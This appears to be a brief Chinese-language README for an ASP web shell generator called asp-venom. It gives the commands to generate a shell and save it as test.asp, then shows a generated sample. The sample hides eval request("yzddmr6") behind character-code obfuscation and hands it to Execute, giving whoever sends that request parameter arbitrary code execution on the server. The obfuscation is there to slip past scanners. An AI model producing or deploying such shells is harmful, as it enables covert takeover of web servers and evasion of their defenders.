## 使用方法

```
python3 asp-venom.py         //生成

python3 asp-venom.py >  test.asp        //保存
```
## 生成样例

```
<%
<!--
Function Hsnh(Bjhu):
	Bjhu = Split(Bjhu,"|")
	For x=1 To Ubound(Bjhu)
		Hsnh=Hsnh&Chr(Bjhu(x)-31)
	Next
End Function
EXecutE(Hsnh("|132|149|128|139|63|145|132|144|148|132|146|147|71|65|152|153|131|131|140|145|85|65|72"))
-->
%>
```
